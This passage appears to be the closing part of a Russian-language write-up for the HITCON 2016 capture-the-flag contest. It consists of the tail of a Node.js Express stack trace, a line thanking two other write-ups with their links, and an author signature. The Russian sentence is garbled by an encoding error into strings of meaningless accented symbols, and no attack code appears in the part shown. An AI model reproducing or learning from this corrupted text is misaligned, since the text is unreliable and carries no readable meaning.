    at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/HITCON/node_modules/express/lib/router/route.js:131:13)
    at Route.dispatch (/root/HITCON/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
    at /root/HITCON/node_modules/express/lib/router/index.js:277:22
```

–û–≥—Ä–æ–º–Ω–æ–µ —Å–ø–∞—Å–∏–±–æ –∑–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∫–æ—Ç–æ—Ä—É—é —è –ø–æ—á–µ—Ä–ø–Ω—É–ª –∏–∑ —Å–ª–µ–¥—É—é—â–∏—Ö –≤—Ä–∞–π—Ç–∞–ø–æ–≤:

* http://lorexxar.cn/2016/10/10/hitcon2016/
* http://ctfs.ghost.io/hello-hitcon-2016-ctf/

–ê–≤—Ç–æ—Ä **n0z3r0** 